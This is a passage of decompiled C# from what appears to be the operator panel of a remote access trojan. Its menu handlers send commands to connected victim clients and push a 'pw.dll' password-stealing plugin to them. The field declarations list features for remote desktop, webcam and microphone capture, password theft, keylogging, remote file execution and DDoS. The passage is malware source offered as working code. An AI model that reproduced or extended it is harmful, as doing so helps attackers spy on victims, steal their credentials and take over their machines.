					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[] { "fun" }, null, null, null, true);
				}
			}
			finally
			{
				
			}
		}

		// Token: 0x060001E7 RID: 487 RVA: 0x00159020 File Offset: 0x00157420
		private void Plugin2ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L1.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[] { "pas" }, null, null, null, true);
				}
			}
			finally
			{
				
			}
		}

		// Token: 0x060001E8 RID: 488 RVA: 0x001590B8 File Offset: 0x001574B8
		private void Plugin1ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				Class7.Class9 @class = Class7.smethod_0("pw.dll", null);
				try
				{
					foreach (object obj in this.L1.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						Class7.smethod_2((Client)dataGridViewRow.Tag, @class, true);
					}
				}
				finally
				{
					
				}
			}
		}

		// Token: 0x060001E9 RID: 489 RVA: 0x0015915C File Offset: 0x0015755C
		private void SdfghToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.Show();
		}

		// Token: 0x060001EA RID: 490 RVA: 0x00159168 File Offset: 0x00157568
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void ExitToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			ProjectData.EndApp();
		}

		// Token: 0x040000AF RID: 175
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x040000B1 RID: 177
		[AccessedThroughProperty("StatusStrip1")]
		private StatusStrip _StatusStrip1;

		// Token: 0x040000B2 RID: 178
		[AccessedThroughProperty("ToolStripStatusLabel1")]
		private ToolStripStatusLabel _ToolStripStatusLabel1;

		// Token: 0x040000B3 RID: 179
		[AccessedThroughProperty("ToolStripStatusLabel3")]
		private ToolStripStatusLabel _ToolStripStatusLabel3;

		// Token: 0x040000B4 RID: 180
		[AccessedThroughProperty("ToolStripStatusLabel5")]
		private ToolStripStatusLabel _ToolStripStatusLabel5;

		// Token: 0x040000B5 RID: 181
		[AccessedThroughProperty("ToolStripStatusLabel4")]
		private ToolStripStatusLabel _ToolStripStatusLabel4;

		// Token: 0x040000B6 RID: 182
		[AccessedThroughProperty("conz")]
		private ToolStripStatusLabel _conz;

		// Token: 0x040000B7 RID: 183
		[AccessedThroughProperty("upl")]
		private ToolStripStatusLabel _upl;

		// Token: 0x040000B8 RID: 184
		[AccessedThroughProperty("dwn")]
		private ToolStripStatusLabel _dwn;

		// Token: 0x040000B9 RID: 185
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x040000BA RID: 186
		[AccessedThroughProperty("ManagerToolStripMenuItem")]
		private ToolStripMenuItem _ManagerToolStripMenuItem;

		// Token: 0x040000BB RID: 187
		[AccessedThroughProperty("RunFileToolStripMenuItem")]
		private ToolStripMenuItem _RunFileToolStripMenuItem;

		// Token: 0x040000BC RID: 188
		[AccessedThroughProperty("FromLinkToolStripMenuItem")]
		private ToolStripMenuItem _FromLinkToolStripMenuItem;

		// Token: 0x040000BD RID: 189
		[AccessedThroughProperty("FromDiskToolStripMenuItem")]
		private ToolStripMenuItem _FromDiskToolStripMenuItem;

		// Token: 0x040000BE RID: 190
		[AccessedThroughProperty("ScriptToolStripMenuItem")]
		private ToolStripMenuItem _ScriptToolStripMenuItem;

		// Token: 0x040000BF RID: 191
		[AccessedThroughProperty("RemoteDesktopToolStripMenuItem")]
		private ToolStripMenuItem _RemoteDesktopToolStripMenuItem;

		// Token: 0x040000C0 RID: 192
		[AccessedThroughProperty("RemoteCamToolStripMenuItem")]
		private ToolStripMenuItem _RemoteCamToolStripMenuItem;

		// Token: 0x040000C1 RID: 193
		[AccessedThroughProperty("MicrophoneToolStripMenuItem")]
		private ToolStripMenuItem _MicrophoneToolStripMenuItem;

		// Token: 0x040000C2 RID: 194
		[AccessedThroughProperty("GetPasswordsToolStripMenuItem")]
		private ToolStripMenuItem _GetPasswordsToolStripMenuItem;

		// Token: 0x040000C3 RID: 195
		[AccessedThroughProperty("KeyloggerToolStripMenuItem")]
		private ToolStripMenuItem _KeyloggerToolStripMenuItem;

		// Token: 0x040000C4 RID: 196
		[AccessedThroughProperty("OpenChatToolStripMenuItem")]
		private ToolStripMenuItem _OpenChatToolStripMenuItem;

		// Token: 0x040000C5 RID: 197
		[AccessedThroughProperty("ServerToolStripMenuItem")]
		private ToolStripMenuItem _ServerToolStripMenuItem;

		// Token: 0x040000C6 RID: 198
		[AccessedThroughProperty("UpdateToolStripMenuItem")]
		private ToolStripMenuItem _UpdateToolStripMenuItem;

		// Token: 0x040000C7 RID: 199
		[AccessedThroughProperty("FromDISKToolStripMenuItem1")]
		private ToolStripMenuItem _FromDISKToolStripMenuItem1;

		// Token: 0x040000C8 RID: 200
		[AccessedThroughProperty("FromLINKToolStripMenuItem1")]
		private ToolStripMenuItem _FromLINKToolStripMenuItem1;

		// Token: 0x040000C9 RID: 201
		[AccessedThroughProperty("UninstallToolStripMenuItem")]
		private ToolStripMenuItem _UninstallToolStripMenuItem;

		// Token: 0x040000CA RID: 202
		[AccessedThroughProperty("RestartToolStripMenuItem")]
		private ToolStripMenuItem _RestartToolStripMenuItem;

		// Token: 0x040000CB RID: 203
		[AccessedThroughProperty("CloseToolStripMenuItem")]
		private ToolStripMenuItem _CloseToolStripMenuItem;

		// Token: 0x040000CC RID: 204
		[AccessedThroughProperty("DisconnectToolStripMenuItem")]
		private ToolStripMenuItem _DisconnectToolStripMenuItem;

		// Token: 0x040000CD RID: 205
		[AccessedThroughProperty("RenameToolStripMenuItem")]
		private ToolStripMenuItem _RenameToolStripMenuItem;

		// Token: 0x040000CE RID: 206
		[AccessedThroughProperty("OpenFolderToolStripMenuItem")]
		private ToolStripMenuItem _OpenFolderToolStripMenuItem;

		// Token: 0x040000CF RID: 207
		[AccessedThroughProperty("IMG2")]
		private ImageList _IMG2;

		// Token: 0x040000D0 RID: 208
		[AccessedThroughProperty("NotifyIcon1")]
		private NotifyIcon _NotifyIcon1;

		// Token: 0x040000D1 RID: 209
		[AccessedThroughProperty("L1")]
		private L1 _L1;

		// Token: 0x040000D2 RID: 210
		[AccessedThroughProperty("Pp1")]
		private Pp1 _Pp1;

		// Token: 0x040000D3 RID: 211
		[AccessedThroughProperty("Timer1")]
		private System.Windows.Forms.Timer _Timer1;

		// Token: 0x040000D4 RID: 212
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x040000D5 RID: 213
		[AccessedThroughProperty("OpenSitesToolStripMenuItem")]
		private ToolStripMenuItem _OpenSitesToolStripMenuItem;

		// Token: 0x040000D6 RID: 214
		[AccessedThroughProperty("DDoSToolStripMenuItem")]
		private ToolStripMenuItem _DDoSToolStripMenuItem;

		// Token: 0x040000D7 RID: 215
		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		// Token: 0x040000D8 RID: 216
		[AccessedThroughProperty("Plugin1ToolStripMenuItem")]
		private ToolStripMenuItem _Plugin1ToolStripMenuItem;

		// Token: 0x040000D9 RID: 217
		[AccessedThroughProperty("Plugin2ToolStripMenuItem")]
		private ToolStripMenuItem _Plugin2ToolStripMenuItem;

		// Token: 0x040000DA RID: 218
		[AccessedThroughProperty("ContextMenuStrip2")]
		private ContextMenuStrip _ContextMenuStrip2;

		// Token: 0x040000DB RID: 219
		[AccessedThroughProperty("SdfghToolStripMenuItem")]
		private ToolStripMenuItem _SdfghToolStripMenuItem;

		// Token: 0x040000DC RID: 220
		[AccessedThroughProperty("ToolStripSeparator1")]
		private ToolStripSeparator _ToolStripSeparator1;

		// Token: 0x040000DD RID: 221
		[AccessedThroughProperty("ExitToolStripMenuItem")]
		private ToolStripMenuItem _ExitToolStripMenuItem;

		// Token: 0x040000DE RID: 222
		private int int_0;

		// Token: 0x040000DF RID: 223
		public bool isActive;

		// Token: 0x040000E0 RID: 224
		public int port;

		// Token: 0x040000E1 RID: 225
		public SK S;

		// Token: 0x040000E2 RID: 226
		public object Yy;
	}
}
